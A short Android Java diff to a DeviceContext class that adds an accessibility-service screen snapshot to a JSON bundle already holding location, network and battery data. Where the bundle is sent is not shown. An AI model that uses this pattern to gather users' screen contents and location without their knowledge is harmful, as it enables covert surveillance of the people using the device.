@@ -17,12 +17,12 @@ public final class DeviceContext {
         JSONObject o = new JSONObject();
         try {
             BatteryManager bm = (BatteryManager)c.getSystemService(Context.BATTERY_SERVICE);
-            int pct = bm.getIntProperty(BatteryManager.BATTERY_PROPERTY_CAPACITY);
-            o.put("batteryPercent", pct);
+            o.put("batteryPercent", bm.getIntProperty(BatteryManager.BATTERY_PROPERTY_CAPACITY));
             o.put("charging", bm.isCharging());
             o.put("network", network(c));
             o.put("timeMillis", System.currentTimeMillis());
             o.put("location", locationJson(c));
+            o.put("screen", AtlasAccessibilityService.screenSnapshot());
         } catch (Exception ignored) {}
         return o;
     }
